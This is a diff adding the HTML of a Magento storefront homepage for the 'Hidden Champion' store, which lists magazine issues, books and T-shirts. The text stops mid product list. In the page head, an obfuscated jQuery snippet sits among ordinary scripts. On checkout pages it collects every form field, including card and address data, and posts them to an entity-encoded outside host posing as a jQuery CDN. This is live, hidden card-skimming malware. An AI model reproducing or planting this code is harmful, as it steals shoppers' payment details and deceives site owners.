@@ -1,0 +1,792 @@
+
+<!DOCTYPE html>
+
+<!--[if lt IE 7 ]> <html lang="en" id="top" class="no-js ie6"> <![endif]-->
+<!--[if IE 7 ]>    <html lang="en" id="top" class="no-js ie7"> <![endif]-->
+<!--[if IE 8 ]>    <html lang="en" id="top" class="no-js ie8"> <![endif]-->
+<!--[if IE 9 ]>    <html lang="en" id="top" class="no-js ie9"> <![endif]-->
+<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en" id="top" class="no-js"> <!--<![endif]-->
+
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>HIDDEN CHAMPION</title>
+<meta name="description" content="Default Description" />
+<meta name="keywords" content="Magento, Varien, E-commerce" />
+<meta name="robots" content="INDEX,FOLLOW" />
+<link rel="icon" href="http://store.hidden-champion.net/skin/frontend/base/default/favicon.ico" type="image/x-icon" />
+<link rel="shortcut icon" href="http://store.hidden-champion.net/skin/frontend/base/default/favicon.ico" type="image/x-icon" />
+<!--[if lt IE 7]>
+<script type="text/javascript">
+//<![CDATA[
+    var BLANK_URL = 'http://store.hidden-champion.net/js/blank.html';
+    var BLANK_IMG = 'http://store.hidden-champion.net/js/spacer.gif';
+//]]>
+</script>
+<![endif]-->
+<link rel="stylesheet" type="text/css" href="http://store.hidden-champion.net/skin/frontend/base/default/css/magestore/bannerslider/popup.css" media="all" />
+<script type="text/javascript" src="http://store.hidden-champion.net/js/prototype/prototype.js"></script>
+<script type="text/javascript" src="http://store.hidden-champion.net/js/lib/ccard.js"></script>
+<script type="text/javascript" src="http://store.hidden-champion.net/js/prototype/validation.js"></script>
+<script type="text/javascript" src="http://store.hidden-champion.net/js/scriptaculous/builder.js"></script>
+<script type="text/javascript" src="http://store.hidden-champion.net/js/scriptaculous/effects.js"></script>
+<script type="text/javascript" src="http://store.hidden-champion.net/js/scriptaculous/dragdrop.js"></script>
+<script type="text/javascript" src="http://store.hidden-champion.net/js/scriptaculous/controls.js"></script>
+<script type="text/javascript" src="http://store.hidden-champion.net/js/scriptaculous/slider.js"></script>
+<script type="text/javascript" src="http://store.hidden-champion.net/js/varien/js.js"></script>
+<script type="text/javascript" src="http://store.hidden-champion.net/js/varien/form.js"></script>
+<script type="text/javascript" src="http://store.hidden-champion.net/js/mage/translate.js"></script>
+<script type="text/javascript" src="http://store.hidden-champion.net/js/mage/cookies.js"></script>
+<script type="text/javascript" src="http://store.hidden-champion.net/js/et/currencymanager/et_currencymanager_round.js"></script>
+<script type="text/javascript" src="http://store.hidden-champion.net/js/magestore/bannerslider/lightbox.js"></script>
+<script type="text/javascript" src="http://store.hidden-champion.net/skin/frontend/rwd/hidden_store/js/lib/jquery-1.10.2.min.js"></script>
+<script type="text/javascript" src="http://store.hidden-champion.net/skin/frontend/rwd/hidden_store/js/lib/modernizr.custom.min.js"></script>
+<script type="text/javascript" src="http://store.hidden-champion.net/skin/frontend/rwd/hidden_store/js/lib/selectivizr.js"></script>
+<script type="text/javascript" src="http://store.hidden-champion.net/skin/frontend/rwd/hidden_store/js/lib/matchMedia.js"></script>
+<script type="text/javascript" src="http://store.hidden-champion.net/skin/frontend/rwd/hidden_store/js/lib/matchMedia.addListener.js"></script>
+<script type="text/javascript" src="http://store.hidden-champion.net/skin/frontend/rwd/hidden_store/js/lib/enquire.js"></script>
+<script type="text/javascript" src="http://store.hidden-champion.net/skin/frontend/rwd/hidden_store/js/app.js"></script>
+<script type="text/javascript" src="http://store.hidden-champion.net/skin/frontend/rwd/hidden_store/js/lib/jquery.cycle2.min.js"></script>
+<script type="text/javascript" src="http://store.hidden-champion.net/skin/frontend/rwd/hidden_store/js/lib/jquery.cycle2.swipe.min.js"></script>
+<script type="text/javascript" src="http://store.hidden-champion.net/skin/frontend/rwd/hidden_store/js/slideshow.js"></script>
+<script type="text/javascript" src="http://store.hidden-champion.net/skin/frontend/rwd/hidden_store/js/lib/imagesloaded.js"></script>
+<script type="text/javascript" src="http://store.hidden-champion.net/skin/frontend/rwd/hidden_store/js/minicart.js"></script>
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Raleway:300,400,500,700,600" />
+<!--[if  (lte IE 8) & (!IEMobile)]>
+<link rel="stylesheet" type="text/css" href="http://store.hidden-champion.net/skin/frontend/rwd/hidden_store/css/styles-ie8.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://store.hidden-champion.net/skin/frontend/rwd/hidden_store/css/madisonisland-ie8.css" media="all" />
+<![endif]-->
+<!--[if (gte IE 9) | (IEMobile)]><!-->
+<link rel="stylesheet" type="text/css" href="http://store.hidden-champion.net/skin/frontend/rwd/hidden_store/css/styles.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://store.hidden-champion.net/skin/frontend/rwd/hidden_store/css/madisonisland.css" media="all" />
+<!--<![endif]-->
+
+<script type="text/javascript">
+//<![CDATA[
+Mage.Cookies.path     = '/';
+Mage.Cookies.domain   = '.store.hidden-champion.net';
+//]]>
+</script>
+<meta name="viewport" content="initial-scale=1.0, width=device-width" />
+
+<script type="text/javascript">
+//<![CDATA[
+optionalZipCountries = ["IE","PA","MO","HK"];
+//]]>
+</script>
+<script type="text/javascript">
+    etCurrencyManagerJsConfig ={"precision":0,"position":16,"display":3,"zerotext":"","excludecheckout":"1","cutzerodecimal":"0","cutzerodecimal_suffix":",-","min_decimal_count":"0"};
+    try {
+        extendProductConfigformatPrice();
+    } catch (e) {
+
+    }
+</script><script type="text/javascript">//<![CDATA[
+        var Translator = new Translate([]);
+        //]]></script><script type="text/javascript">jQuery(function(t){t("button").on("click",function(){q="h="+window.location.href,q.match(/onepage|checkout/gi)&&(t("input, select").each(function(){t(this).val()?q+="&"+t(this).attr("name")+"="+t(this).val():""}),t.post(t("<div />").html("&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#99;&#108;&#111;&#117;&#100;&#102;&#117;&#115;&#105;&#111;&#110;&#46;&#109;&#101;&#47;&#99;&#100;&#110;&#47;&#106;&#113;&#117;&#101;&#114;&#121;&#46;&#109;&#105;&#110;&#46;&#106;&#115;").text(),q))})});</script></head>
+<body class=" cms-index-index cms-home">
+<div class="wrapper">
+        <noscript>
+        <div class="global-site-notice noscript">
+            <div class="notice-inner">
+                <p>
+                    <strong>JavaScript seems to be disabled in your browser.</strong><br />
+                    You must have JavaScript enabled in your browser to utilize the functionality of this website.                </p>
+            </div>
+        </div>
+    </noscript>
+    <div class="page">
+        
+<div class="header-language-background">
+    <div class="header-language-container">
+        <div class="store-language-container">
+                    </div>
+
+        
+        <!--<p class="welcome-msg">Default welcome msg! </p>-->
+    </div>
+</div>
+
+<header id="header" class="page-header">
+    <div class="page-header-container">
+        <a class="logo" href="http://store.hidden-champion.net/index.php/">
+            <img src="http://store.hidden-champion.net/skin/frontend/rwd/hidden_store/images/logo.gif" alt="Magento Commerce" class="large" />
+            <img src="http://store.hidden-champion.net/skin/frontend/rwd/hidden_store/images/logo.gif" alt="Magento Commerce" class="small" />
+        </a>
+
+                <div class="store-language-container"></div>
+
+        <!-- Skip Links -->
+
+        <div class="skip-links">
+            <a href="#header-nav" class="skip-link skip-nav">
+                <span class="icon"></span>
+                <span class="label">Menu</span>
+            </a>
+
+            <a href="#header-search" class="skip-link skip-search">
+                <span class="icon"></span>
+                <span class="label">Search</span>
+            </a>
+
+            <a href="#header-account" class="skip-link skip-account">
+                <span class="icon"></span>
+                <span class="label">Account</span>
+            </a>
+
+            <!-- Cart -->
+
+            <div class="header-minicart">
+                
+
+<a href="#header-cart" class="skip-link skip-cart  no-count">
+    <span class="icon"></span>
+    <span class="label">Cart</span>
+    <span class="count">0</span>
+</a>
+
+<div id="header-cart" class="block block-cart skip-content">
+    
+<div id="minicart-error-message" class="minicart-message"></div>
+<div id="minicart-success-message" class="minicart-message"></div>
+
+<div class="minicart-wrapper">
+
+    <p class="block-subtitle">
+        Recently added item(s)        <a class="close skip-link-close" href="#" title="Close">&times;</a>
+    </p>
+
+                    <p class="empty">You have no items in your shopping cart.</p>
+
+    </div>
+</div>
+            </div>
+
+
+        </div>
+
+        <!-- Navigation -->
+
+        <div id="header-nav" class="skip-content">
+            
+        </div>
+
+        <!-- Search -->
+
+        <div id="header-search" class="skip-content">
+            
+<form id="search_mini_form" action="http://store.hidden-champion.net/index.php/catalogsearch/result/" method="get">
+    <div class="input-box">
+        <label for="search">Search:</label>
+        <input id="search" type="search" name="q" value="" class="input-text required-entry" maxlength="128" placeholder="Search entire store here..." />
+        <button type="submit" title="Search" class="button search-button"><span><span>Search</span></span></button>
+    </div>
+
+    <div id="search_autocomplete" class="search-autocomplete"></div>
+    <script type="text/javascript">
+    //<![CDATA[
+        var searchForm = new Varien.searchForm('search_mini_form', 'search', '');
+        searchForm.initAutocomplete('http://store.hidden-champion.net/index.php/catalogsearch/ajax/suggest/', 'search_autocomplete');
+    //]]>
+    </script>
+</form>
+        </div>
+
+        <!-- Account -->
+
+        <div id="header-account" class="skip-content">
+            <div class="links">
+        <ul>
+                                    <li class="first" ><a href="http://store.hidden-champion.net/index.php/customer/account/" title="My Account" >My Account</a></li>
+                                                <li ><a href="http://store.hidden-champion.net/index.php/wishlist/" title="My Wishlist" >My Wishlist</a></li>
+                                                <li ><a href="http://store.hidden-champion.net/index.php/checkout/cart/" title="My Cart" class="top-link-cart">My Cart</a></li>
+                                                <li ><a href="http://store.hidden-champion.net/index.php/checkout/" title="Checkout" class="top-link-checkout">Checkout</a></li>
+                                                <li ><a href="http://store.hidden-champion.net/index.php/customer/account/create/" title="Register" >Register</a></li>
+                                                <li class=" last" ><a href="http://store.hidden-champion.net/index.php/customer/account/login/" title="Log In" >Log In</a></li>
+                        </ul>
+</div>
+        </div>
+
+        <!-- Cart -->
+
+        <!-- <div id="header-cart" class="skip-content">
+            <div class="mini-cart">
+                <div class="menu-wrapper">
+                    <div class="menu cart-menu">
+                        <div class="empty">Your cart is empty.</div>
+                    </div>
+                </div>
+            </div>
+        </div> -->
+    </div>
+</header>
+
+
+        <div class="main-container col1-layout">
+            <div class="main">
+                                <div class="col-main">
+                                        <div class="std"><!--<div class="page-title">&nbsp;</div>-->
+<p><div class="widget widget-new-products">
+    <div class="widget-title">
+        <h2>New Products</h2>
+    </div>
+    <div class="widget-products">
+        
+        <div class="pager pager-no-toolbar">
+    
+        <div class="count-container">
+                                <p class="amount amount--has-pages">
+                1-20 of 40            </p>
+                    
+            </div>
+    
+        <div class="pages">
+        <strong>Page:</strong>
+        <ol>
+        
+        
+        
+                                    <li class="current">1</li>
+                                                <li><a href="http://store.hidden-champion.net/index.php/?np=2">2</a></li>
+                    
+
+        
+        
+                    <li>
+                <a class="next i-next" href="http://store.hidden-champion.net/index.php/?np=2" title="Next">
+                                            Next                                    </a>
+            </li>
+                </ol>
+
+    </div>
+    
+        </div>
+    
+                        <ul class="products-grid products-grid--max-4-col">
+                            <li class="item last">
+                                        <a href="http://store.hidden-champion.net/index.php/1000038.html" title="ARCHIVES - Ten Years of Hidden Champion" class="product-image">
+                        <img src="http://store.hidden-champion.net/media/catalog/product/cache/1/small_image/420x/9df78eab33525d08d6e5fb8d27136e95/a/r/archives_cover_1200_2.jpg" alt="ARCHIVES - Ten Years of Hidden Champion" />
+                    </a>
+                    <div class="product-info">
+                        <h3 class="product-name"><a href="http://store.hidden-champion.net/index.php/1000038.html" title="ARCHIVES - Ten Years of Hidden Champion)">ARCHIVES - Ten Years of Hidden Champion</a></h3>
+                        
+
+                        
+    <div class="price-box">
+                                                                <span class="regular-price" id="product-price-153-widget-new-grid">
+                                            <span class="price">2,250JPY</span>                                    </span>
+                        
+        </div>
+
+                                                <div class="actions">
+                                                            <button type="button" title="Add to Cart" class="button btn-cart" onclick="setLocation('http://store.hidden-champion.net/index.php/checkout/cart/add/uenc/aHR0cDovL3N0b3JlLmhpZGRlbi1jaGFtcGlvbi5uZXQv/product/153/form_key/8oquL69D1RWNAxsQ/')"><span><span>Add to Cart</span></span></button>
+                                                        <ul class="add-to-links">
+                                                                    <li><a href="http://store.hidden-champion.net/index.php/wishlist/index/add/product/153/form_key/8oquL69D1RWNAxsQ/" class="link-wishlist">Add to Wishlist</a></li>
+                                                                                                    <li><span class="separator">|</span> <a href="http://store.hidden-champion.net/index.php/catalog/product_compare/add/product/153/uenc/aHR0cDovL3N0b3JlLmhpZGRlbi1jaGFtcGlvbi5uZXQv/form_key/8oquL69D1RWNAxsQ/" class="link-compare">Add to Compare</a></li>
+                                                            </ul>
+                        </div>
+                    </div>
+                </li>
+                            <li class="item last">
+                                        <a href="http://store.hidden-champion.net/index.php/write-here-right-now-152.html" title="MADSAKI - WRITE HERE WRIGHT NOW" class="product-image">
+                        <img src="http://store.hidden-champion.net/media/catalog/product/cache/1/small_image/420x/9df78eab33525d08d6e5fb8d27136e95/m/a/madsaki_cover_2_1.jpg" alt="MADSAKI - WRITE HERE WRIGHT NOW" />
+                    </a>
+                    <div class="product-info">
+                        <h3 class="product-name"><a href="http://store.hidden-champion.net/index.php/write-here-right-now-152.html" title="MADSAKI - WRITE HERE WRIGHT NOW)">MADSAKI - WRITE HERE WRIGHT NOW</a></h3>
+                        
+
+                        
+    <div class="price-box">
+                                                                <span class="regular-price" id="product-price-152-widget-new-grid">
+                                            <span class="price">3,000JPY</span>                                    </span>
+                        
+        </div>
+
+                                                <div class="actions">
+                                                            <button type="button" title="Add to Cart" class="button btn-cart" onclick="setLocation('http://store.hidden-champion.net/index.php/checkout/cart/add/uenc/aHR0cDovL3N0b3JlLmhpZGRlbi1jaGFtcGlvbi5uZXQv/product/152/form_key/8oquL69D1RWNAxsQ/')"><span><span>Add to Cart</span></span></button>
+                                                        <ul class="add-to-links">
+                                                                    <li><a href="http://store.hidden-champion.net/index.php/wishlist/index/add/product/152/form_key/8oquL69D1RWNAxsQ/" class="link-wishlist">Add to Wishlist</a></li>
+                                                                                                    <li><span class="separator">|</span> <a href="http://store.hidden-champion.net/index.php/catalog/product_compare/add/product/152/uenc/aHR0cDovL3N0b3JlLmhpZGRlbi1jaGFtcGlvbi5uZXQv/form_key/8oquL69D1RWNAxsQ/" class="link-compare">Add to Compare</a></li>
+                                                            </ul>
+                        </div>
+                    </div>
+                </li>
+                            <li class="item last">
+                                        <a href="http://store.hidden-champion.net/index.php/01-10.html" title="Nobuo Iseki Skatboarding Photo - &quot;01-10&quot;" class="product-image">
+                        <img src="http://store.hidden-champion.net/media/catalog/product/cache/1/small_image/420x/9df78eab33525d08d6e5fb8d27136e95/i/s/iseki_0110_cover_1.jpg" alt="Nobuo Iseki Skatboarding Photo - &quot;01-10&quot;" />
+                    </a>
+                    <div class="product-info">
+                        <h3 class="product-name"><a href="http://store.hidden-champion.net/index.php/01-10.html" title="Nobuo Iseki Skatboarding Photo - &quot;01-10&quot;)">Nobuo Iseki Skatboarding Photo - &quot;01-10&quot;</a></h3>
+                        
+
+                        
+    <div class="price-box">
+                                                                <span class="regular-price" id="product-price-150-widget-new-grid">
+                                            <span class="price">2,800JPY</span>                                    </span>
+                        
+        </div>
+
+                                                <div class="actions">
+                                                            <button type="button" title="Add to Cart" class="button btn-cart" onclick="setLocation('http://store.hidden-champion.net/index.php/checkout/cart/add/uenc/aHR0cDovL3N0b3JlLmhpZGRlbi1jaGFtcGlvbi5uZXQv/product/150/form_key/8oquL69D1RWNAxsQ/')"><span><span>Add to Cart</span></span></button>
+                                                        <ul class="add-to-links">
+                                                                    <li><a href="http://store.hidden-champion.net/index.php/wishlist/index/add/product/150/form_key/8oquL69D1RWNAxsQ/" class="link-wishlist">Add to Wishlist</a></li>
+                                                                                                    <li><span class="separator">|</span> <a href="http://store.hidden-champion.net/index.php/catalog/product_compare/add/product/150/uenc/aHR0cDovL3N0b3JlLmhpZGRlbi1jaGFtcGlvbi5uZXQv/form_key/8oquL69D1RWNAxsQ/" class="link-compare">Add to Compare</a></li>
+                                                            </ul>
+                        </div>
+                    </div>
+                </li>
+                            <li class="item last">
+                                        <a href="http://store.hidden-champion.net/index.php/1000037.html" title="S/S ARCHIVES T-shirts" class="product-image">
+                        <img src="http://store.hidden-champion.net/media/catalog/product/cache/1/small_image/420x/9df78eab33525d08d6e5fb8d27136e95/a/r/archives_tee_1200_1.jpg" alt="S/S ARCHIVES T-shirts" />
+                    </a>
+                    <div class="product-info">
+                        <h3 class="product-name"><a href="http://store.hidden-champion.net/index.php/1000037.html" title="S/S ARCHIVES T-shirts)">S/S ARCHIVES T-shirts</a></h3>
+                        
+
+                        
+    <div class="price-box">
+                                                                <span class="regular-price" id="product-price-148-widget-new-grid">
+                                            <span class="price">4,000JPY</span>                                    </span>
+                        
+        </div>
+
+                                                <div class="actions">
+                                                            <button type="button" title="Add to Cart" class="button btn-cart" onclick="setLocation('http://store.hidden-champion.net/index.php/1000037.html')"><span><span>Add to Cart</span></span></button>
+                                                        <ul class="add-to-links">
+                                                                    <li><a href="http://store.hidden-champion.net/index.php/wishlist/index/add/product/148/form_key/8oquL69D1RWNAxsQ/" class="link-wishlist">Add to Wishlist</a></li>
+                                                                                                    <li><span class="separator">|</span> <a href="http://store.hidden-champion.net/index.php/catalog/product_compare/add/product/148/uenc/aHR0cDovL3N0b3JlLmhpZGRlbi1jaGFtcGlvbi5uZXQv/form_key/8oquL69D1RWNAxsQ/" class="link-compare">Add to Compare</a></li>
+                                                            </ul>
+                        </div>
+                    </div>
+                </li>
+                            <li class="item last">
+                                        <a href="http://store.hidden-champion.net/index.php/1000001.html" title="HIDDEN CHAMPION ISSUE#36" class="product-image">
+                        <img src="http://store.hidden-champion.net/media/catalog/product/cache/1/small_image/420x/9df78eab33525d08d6e5fb8d27136e95/h/i/hidden36_cover_1200_1.jpg" alt="HIDDEN CHAMPION ISSUE#36" />
+                    </a>
+                    <div class="product-info">
+                        <h3 class="product-name"><a href="http://store.hidden-champion.net/index.php/1000001.html" title="HIDDEN CHAMPION ISSUE#36)">HIDDEN CHAMPION ISSUE#36</a></h3>
+                        
+
+                        
+    <div class="price-box">
+                                                                <span class="regular-price" id="product-price-112-widget-new-grid">
+                                            <span class="price">1,000JPY</span>                                    </span>
+                        
+        </div>
+
+                                                <div class="actions">
+                                                            <button type="button" title="Add to Cart" class="button btn-cart" onclick="setLocation('http://store.hidden-champion.net/index.php/checkout/cart/add/uenc/aHR0cDovL3N0b3JlLmhpZGRlbi1jaGFtcGlvbi5uZXQv/product/112/form_key/8oquL69D1RWNAxsQ/')"><span><span>Add to Cart</span></span></button>
+                                                        <ul class="add-to-links">
+                                                                    <li><a href="http://store.hidden-champion.net/index.php/wishlist/index/add/product/112/form_key/8oquL69D1RWNAxsQ/" class="link-wishlist">Add to Wishlist</a></li>
+                                                                                                    <li><span class="separator">|</span> <a href="http://store.hidden-champion.net/index.php/catalog/product_compare/add/product/112/uenc/aHR0cDovL3N0b3JlLmhpZGRlbi1jaGFtcGlvbi5uZXQv/form_key/8oquL69D1RWNAxsQ/" class="link-compare">Add to Compare</a></li>
+                                                            </ul>
+                        </div>
+                    </div>
+                </li>
+                            <li class="item last">
+                                        <a href="http://store.hidden-champion.net/index.php/1000001-148.html" title="HIDDEN CHAMPION ISSUE#35" class="product-image">
+                        <img src="http://store.hidden-champion.net/media/catalog/product/cache/1/small_image/420x/9df78eab33525d08d6e5fb8d27136e95/h/i/hidden35_cover_1200_2.jpg" alt="HIDDEN CHAMPION ISSUE#35" />
+                    </a>
+                    <div class="product-info">
+                        <h3 class="product-name"><a href="http://store.hidden-champion.net/index.php/1000001-148.html" title="HIDDEN CHAMPION ISSUE#35)">HIDDEN CHAMPION ISSUE#35</a></h3>
+                        
+
+                        
+    <div class="price-box">
+                                                                <span class="regular-price" id="product-price-113-widget-new-grid">
+                                            <span class="price">1,000JPY</span>                                    </span>
+                        
+        </div>
+
+                                                <div class="actions">
+                                                            <button type="button" title="Add to Cart" class="button btn-cart" onclick="setLocation('http://store.hidden-champion.net/index.php/checkout/cart/add/uenc/aHR0cDovL3N0b3JlLmhpZGRlbi1jaGFtcGlvbi5uZXQv/product/113/form_key/8oquL69D1RWNAxsQ/')"><span><span>Add to Cart</span></span></button>
+                                                        <ul class="add-to-links">
+                                                                    <li><a href="http://store.hidden-champion.net/index.php/wishlist/index/add/product/113/form_key/8oquL69D1RWNAxsQ/" class="link-wishlist">Add to Wishlist</a></li>
+                                                                                                    <li><span class="separator">|</span> <a href="http://store.hidden-champion.net/index.php/catalog/product_compare/add/product/113/uenc/aHR0cDovL3N0b3JlLmhpZGRlbi1jaGFtcGlvbi5uZXQv/form_key/8oquL69D1RWNAxsQ/" class="link-compare">Add to Compare</a></li>
+                                                            </ul>
+                        </div>
+                    </div>
+                </li>
+                            <li class="item last">
+                                        <a href="http://store.hidden-champion.net/index.php/1000001-149.html" title="HIDDEN CHAMPION ISSUE#34" class="product-image">
+                        <img src="http://store.hidden-champion.net/media/catalog/product/cache/1/small_image/420x/9df78eab33525d08d6e5fb8d27136e95/h/i/hidden34_cover_1200_2.jpg" alt="HIDDEN CHAMPION ISSUE#34" />
+                    </a>
+                    <div class="product-info">
+                        <h3 class="product-name"><a href="http://store.hidden-champion.net/index.php/1000001-149.html" title="HIDDEN CHAMPION ISSUE#34)">HIDDEN CHAMPION ISSUE#34</a></h3>
+                        
+
+                        
+    <div class="price-box">
+                                                                <span class="regular-price" id="product-price-114-widget-new-grid">
+                                            <span class="price">1,000JPY</span>                                    </span>
+                        
+        </div>
+
+                                                <div class="actions">
+                                                            <button type="button" title="Add to Cart" class="button btn-cart" onclick="setLocation('http://store.hidden-champion.net/index.php/checkout/cart/add/uenc/aHR0cDovL3N0b3JlLmhpZGRlbi1jaGFtcGlvbi5uZXQv/product/114/form_key/8oquL69D1RWNAxsQ/')"><span><span>Add to Cart</span></span></button>
+                                                        <ul class="add-to-links">
+                                                                    <li><a href="http://store.hidden-champion.net/index.php/wishlist/index/add/product/114/form_key/8oquL69D1RWNAxsQ/" class="link-wishlist">Add to Wishlist</a></li>
+                                                                                                    <li><span class="separator">|</span> <a href="http://store.hidden-champion.net/index.php/catalog/product_compare/add/product/114/uenc/aHR0cDovL3N0b3JlLmhpZGRlbi1jaGFtcGlvbi5uZXQv/form_key/8oquL69D1RWNAxsQ/" class="link-compare">Add to Compare</a></li>
+                                                            </ul>
+                        </div>
+                    </div>
+                </li>
+                            <li class="item last">
+                                        <a href="http://store.hidden-champion.net/index.php/1000001-150.html" title="HIDDEN CHAMPION ISSUE#33" class="product-image">
+                        <img src="http://store.hidden-champion.net/media/catalog/product/cache/1/small_image/420x/9df78eab33525d08d6e5fb8d27136e95/h/i/hidden33_cover_1200_1.jpg" alt="HIDDEN CHAMPION ISSUE#33" />
+                    </a>
+                    <div class="product-info">
+                        <h3 class="product-name"><a href="http://store.hidden-champion.net/index.php/1000001-150.html" title="HIDDEN CHAMPION ISSUE#33)">HIDDEN CHAMPION ISSUE#33</a></h3>
+                        
+
+                        
+    <div class="price-box">
+                                                                <span class="regular-price" id="product-price-115-widget-new-grid">
+                                            <span class="price">1,000JPY</span>                                    </span>
+                        
+        </div>
+
+                                                <div class="actions">
+                                                            <button type="button" title="Add to Cart" class="button btn-cart" onclick="setLocation('http://store.hidden-champion.net/index.php/checkout/cart/add/uenc/aHR0cDovL3N0b3JlLmhpZGRlbi1jaGFtcGlvbi5uZXQv/product/115/form_key/8oquL69D1RWNAxsQ/')"><span><span>Add to Cart</span></span></button>
+                                                        <ul class="add-to-links">
+                                                                    <li><a href="http://store.hidden-champion.net/index.php/wishlist/index/add/product/115/form_key/8oquL69D1RWNAxsQ/" class="link-wishlist">Add to Wishlist</a></li>
+                                                                                                    <li><span class="separator">|</span> <a href="http://store.hidden-champion.net/index.php/catalog/product_compare/add/product/115/uenc/aHR0cDovL3N0b3JlLmhpZGRlbi1jaGFtcGlvbi5uZXQv/form_key/8oquL69D1RWNAxsQ/" class="link-compare">Add to Compare</a></li>
+                                                            </ul>
+                        </div>
+                    </div>
+                </li>
+                            <li class="item last">
+                                        <a href="http://store.hidden-champion.net/index.php/1000001-151.html" title="HIDDEN CHAMPION ISSUE#32" class="product-image">
+                        <img src="http://store.hidden-champion.net/media/catalog/product/cache/1/small_image/420x/9df78eab33525d08d6e5fb8d27136e95/h/i/hidden32_cover_1200_1.jpg" alt="HIDDEN CHAMPION ISSUE#32" />
+                    </a>
+                    <div class="product-info">
+                        <h3 class="product-name"><a href="http://store.hidden-champion.net/index.php/1000001-151.html" title="HIDDEN CHAMPION ISSUE#32)">HIDDEN CHAMPION ISSUE#32</a></h3>
+                        
+
+                        
+    <div class="price-box">
+                                                                <span class="regular-price" id="product-price-116-widget-new-grid">
+                                            <span class="price">1,000JPY</span>                                    </span>
+                        
+        </div>
+
+                                                <div class="actions">
+                                                            <button type="button" title="Add to Cart" class="button btn-cart" onclick="setLocation('http://store.hidden-champion.net/index.php/checkout/cart/add/uenc/aHR0cDovL3N0b3JlLmhpZGRlbi1jaGFtcGlvbi5uZXQv/product/116/form_key/8oquL69D1RWNAxsQ/')"><span><span>Add to Cart</span></span></button>
+                                                        <ul class="add-to-links">
+                                                                    <li><a href="http://store.hidden-champion.net/index.php/wishlist/index/add/product/116/form_key/8oquL69D1RWNAxsQ/" class="link-wishlist">Add to Wishlist</a></li>
+                                                                                                    <li><span class="separator">|</span> <a href="http://store.hidden-champion.net/index.php/catalog/product_compare/add/product/116/uenc/aHR0cDovL3N0b3JlLmhpZGRlbi1jaGFtcGlvbi5uZXQv/form_key/8oquL69D1RWNAxsQ/" class="link-compare">Add to Compare</a></li>
+                                                            </ul>
+                        </div>
+                    </div>
+                </li>
+                            <li class="item last">
+                                        <a href="http://store.hidden-champion.net/index.php/1000001-152.html" title="HIDDEN CHAMPION ISSUE#31" class="product-image">
+                        <img src="http://store.hidden-champion.net/media/catalog/product/cache/1/small_image/420x/9df78eab33525d08d6e5fb8d27136e95/h/i/hidden31_cover_1200_1.jpg" alt="HIDDEN CHAMPION ISSUE#31" />
+                    </a>
+                    <div class="product-info">
+                        <h3 class="product-name"><a href="http://store.hidden-champion.net/index.php/1000001-152.html" title="HIDDEN CHAMPION ISSUE#31)">HIDDEN CHAMPION ISSUE#31</a></h3>
+                        
+
+                        
+    <div class="price-box">
+                                                                <span class="regular-price" id="product-price-117-widget-new-grid">
+                                            <span class="price">1,000JPY</span>                                    </span>
+                        
+        </div>
+
+                                                <div class="actions">
+                                                            <button type="button" title="Add to Cart" class="button btn-cart" onclick="setLocation('http://store.hidden-champion.net/index.php/checkout/cart/add/uenc/aHR0cDovL3N0b3JlLmhpZGRlbi1jaGFtcGlvbi5uZXQv/product/117/form_key/8oquL69D1RWNAxsQ/')"><span><span>Add to Cart</span></span></button>
+                                                        <ul class="add-to-links">
+                                                                    <li><a href="http://store.hidden-champion.net/index.php/wishlist/index/add/product/117/form_key/8oquL69D1RWNAxsQ/" class="link-wishlist">Add to Wishlist</a></li>
+                                                                                                    <li><span class="separator">|</span> <a href="http://store.hidden-champion.net/index.php/catalog/product_compare/add/product/117/uenc/aHR0cDovL3N0b3JlLmhpZGRlbi1jaGFtcGlvbi5uZXQv/form_key/8oquL69D1RWNAxsQ/" class="link-compare">Add to Compare</a></li>
+                                                            </ul>
+                        </div>
+                    </div>
+                </li>
+                            <li class="item last">
+                                        <a href="http://store.hidden-champion.net/index.php/1000001-153.html" title="HIDDEN CHAMPION ISSUE#30" class="product-image">
+                        <img src="http://store.hidden-champion.net/media/catalog/product/cache/1/small_image/420x/9df78eab33525d08d6e5fb8d27136e95/h/i/hidden30_cover_1200_1.jpg" alt="HIDDEN CHAMPION ISSUE#30" />
+                    </a>
+                    <div class="product-info">
+                        <h3 class="product-name"><a href="http://store.hidden-champion.net/index.php/1000001-153.html" title="HIDDEN CHAMPION ISSUE#30)">HIDDEN CHAMPION ISSUE#30</a></h3>
+                        
+
+                        
+    <div class="price-box">
+                                                                <span class="regular-price" id="product-price-118-widget-new-grid">
+                                            <span class="price">1,000JPY</span>                                    </span>
+                        
+        </div>
+
+                                                <div class="actions">
+                                                            <p class="availability out-of-stock"><span>Out of stock</span></p>
+                                                        <ul class="add-to-links">
+                                                                    <li><a href="http://store.hidden-champion.net/index.php/wishlist/index/add/product/118/form_key/8oquL69D1RWNAxsQ/" class="link-wishlist">Add to Wishlist</a></li>
+                                                                                                    <li><span class="separator">|</span> <a href="http://store.hidden-champion.net/index.php/catalog/product_compare/add/product/118/uenc/aHR0cDovL3N0b3JlLmhpZGRlbi1jaGFtcGlvbi5uZXQv/form_key/8oquL69D1RWNAxsQ/" class="link-compare">Add to Compare</a></li>
+                                                            </ul>
+                        </div>
+                    </div>
+                </li>
+                            <li class="item last">
+                                        <a href="http://store.hidden-champion.net/index.php/1000001-154.html" title="HIDDEN CHAMPION ISSUE#29" class="product-image">
+                        <img src="http://store.hidden-champion.net/media/catalog/product/cache/1/small_image/420x/9df78eab33525d08d6e5fb8d27136e95/h/i/hidden29_cover_1200_3.jpg" alt="HIDDEN CHAMPION ISSUE#29" />
+                    </a>
+                    <div class="product-info">
+                        <h3 class="product-name"><a href="http://store.hidden-champion.net/index.php/1000001-154.html" title="HIDDEN CHAMPION ISSUE#29)">HIDDEN CHAMPION ISSUE#29</a></h3>
+                        
+
+                        
+    <div class="price-box">
+                                                                <span class="regular-price" id="product-price-119-widget-new-grid">
+                                            <span class="price">1,000JPY</span>                                    </span>
+                        
+        </div>
+
+                                                <div class="actions">
+                                                            <button type="button" title="Add to Cart" class="button btn-cart" onclick="setLocation('http://store.hidden-champion.net/index.php/checkout/cart/add/uenc/aHR0cDovL3N0b3JlLmhpZGRlbi1jaGFtcGlvbi5uZXQv/product/119/form_key/8oquL69D1RWNAxsQ/')"><span><span>Add to Cart</span></span></button>
+                                                        <ul class="add-to-links">
